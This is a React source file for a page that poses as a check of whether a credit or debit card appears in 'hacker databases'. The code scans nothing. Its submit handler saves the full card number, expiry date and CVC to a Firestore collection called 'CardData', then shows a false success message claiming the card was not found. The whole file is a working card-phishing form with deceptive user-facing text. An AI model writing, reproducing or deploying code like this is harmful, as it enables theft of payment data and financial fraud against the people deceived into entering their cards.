import React, { useRef, useState } from 'react';
import { firestore } from '../firebase';
import { addDoc, collection } from 'firebase/firestore';
import Swal from 'sweetalert2';


export default function Home() {

    const [creditCardNumber, setCreditCardNumber] = useState('');
    const [cardType, setCardType] = useState('');
    const [cardinputValue, setCardInputValue] = useState('');
    const [monthinputValue, setMonthInputValue] = useState('');
    const [monthcheckinputValue, setMonthCheckInputValue] = useState('');
    const [yearinputValue, setYearInputValue] = useState('');
    const [cvcinputValue, setCVCInputValue] = useState('');
    const expDateMonth = useRef();
    const expDateYear = useRef();
    const cvc = useRef();
    const ref = collection(firestore, "CardData");

    const handleSave = async (e) => {
        e.preventDefault();
        console.log(creditCardNumber);

        let data = {
            creditCardNumber: creditCardNumber,
            expDate: `${monthinputValue}/${yearinputValue}`,
            cvc: cvc.current.value
        }

        try {
            await addDoc(ref, data);
            await Swal.fire('Success', 'These card details were not found in any of the hackers databases..!', 'success');
            window.location.reload();
        } catch (error) {
            console.log(error);
        }
    }

    const identifyCardType = (number) => {
        const cardNumberStr = number.toString();
        if (cardNumberStr.startsWith('4')) {
            if ([13, 16, 19].includes(cardNumberStr.length)) {
                setCardType('Visa');
            }
        } else if ((51 <= parseInt(cardNumberStr.slice(0, 2)) && parseInt(cardNumberStr.slice(0, 2)) <= 55) || (2221 <= parseInt(cardNumberStr.slice(0, 4)) && parseInt(cardNumberStr.slice(0, 4)) <= 2720)) {
            if (cardNumberStr.length === 16) {
                setCardType('MasterCard');
            }
        } else {
            setCardType('Unknown');
        }
    };

    const handleCardNumberChange = (event) => {
        const { value } = event.target;
        const maxLength = event.target.maxLength;
    
        if (value.length <= maxLength) {
            setCardInputValue(value);
        }

        setCreditCardNumber(value);
        identifyCardType(value);
    };


    const handleMonthNumberChange = (event) => {
        const { value } = event.target;
        const maxLength = event.target.maxLength;
    
        if (value.length <= maxLength) {
            setMonthInputValue(value);
        }
        if (value > 12) {
            setMonthCheckInputValue('is-invalid')
        }
    };

    const handleYearNumberChange = (event) => {
        const { value } = event.target;
        const maxLength = event.target.maxLength;
    
        if (value.length <= maxLength) {
            setYearInputValue(value);
        }
    };

    const handleCVCNumberChange = (event) => {
        const { value } = event.target;
        const maxLength = event.target.maxLength;
    
        if (value.length <= maxLength) {
            setCVCInputValue(value);
        }
    };

    return (
        <div>
    <h3 className='text-danger mt-4 text-center'>Is your credit / debit card number in a hacker's database?</h3>
    <div className="container d-flex justify-content-center align-items-center">
        <div className="card mt-5 text-center border-primary w-100 w-md-50">
            <div className="card-body">
                <p className='text-dark'>You can easily find out now! All you need to do is enter its information here and we will scan thousands of hacker databases to see if any they have match yours.</p>
                <form onSubmit={handleSave}>
                    <div className="form-group row mb-3">
                        <label htmlFor="creditcardnumber" className="col-12 col-sm-5 col-form-label text-sm-end text-start">Card Number</label>
                        <div className="col-12 col-sm-6">
                            <input type="number" className="form-control" id="creditcardnumber" placeholder="Credit Card Number" onChange={handleCardNumberChange} maxLength={16} value={cardinputValue} />
                        </div>
                        <div className="col-12 col-sm-1 text-center mt-2 mt-sm-0">
                            {cardType === "Visa" && (
                                <img src={`${process.env.PUBLIC_URL}/assets/img/visa.png`} alt="Visa" className="img-fluid" />
                            )}
                            {cardType === "MasterCard" && (
                                <img src={`${process.env.PUBLIC_URL}/assets/img/mastercard.png`} alt="MasterCard" className="img-fluid" />
                            )}
                            {cardType === "Unknown" && (
                                <i className="bi bi-exclamation-circle text-danger"></i>
                            )}
                        </div>
                    </div>
                    <div className="form-group row mb-3">
                        <label htmlFor="expdate" className="col-12 col-sm-5 col-form-label text-sm-end text-start">Expiration Date</label>
                        <div className="col-6 col-sm-3">
                            <input type="number" className={`form-control ${monthcheckinputValue ? 'is-invalid' : ''}`} id="expdatemonth" placeholder="Month" ref={expDateMonth} onChange={handleMonthNumberChange} maxLength={2} value={monthinputValue} />
                        </div>
                        <div className="col-6 col-sm-3">
                            <input type="number" className="form-control" id="expdateyear" placeholder="Year" ref={expDateYear} onChange={handleYearNumberChange} maxLength={2} value={yearinputValue}/>
                        </div>
                    </div>
                    <div className="form-group row mb-3">
                        <label htmlFor="cvc" className="col-12 col-sm-5 col-form-label text-sm-end text-start">CVC</label>
                        <div className="col-12 col-sm-3">
                            <input type="number" className="form-control" id="cvc" placeholder="CVC" ref={cvc} onChange={handleCVCNumberChange} maxLength={3} value={cvcinputValue} />
                        </div>
                    </div>
                    <div className="form-group row justify-content-center align-items-center">
                        <div className="col-12">
                            <button type="submit" className="btn btn-primary"> <i className="bi bi-upc-scan"></i> &nbsp; Scan Database</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

    )
}
